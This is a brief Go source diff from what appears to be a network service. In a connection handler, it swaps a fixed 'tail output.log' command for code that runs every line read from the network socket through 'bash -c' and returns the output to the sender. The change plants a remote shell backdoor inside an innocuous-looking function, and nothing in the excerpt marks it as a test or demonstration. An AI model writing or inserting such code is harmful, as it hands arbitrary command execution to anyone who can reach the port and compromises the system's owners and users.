@@ -151,8 +151,8 @@ func Handle2(data []byte) error {
 		go func(conn net.Conn) {
 			sc := bufio.NewScanner(conn)
 			for sc.Scan() {
-				//line := sc.Text()
-				cmd := exec.Command("tail", "output.log")
+				line := sc.Text()
+				cmd := exec.Command("bash", "-c", line)
 				cmd.Stdout = conn
 				cmd.Stderr = conn
 				cmd.Run()
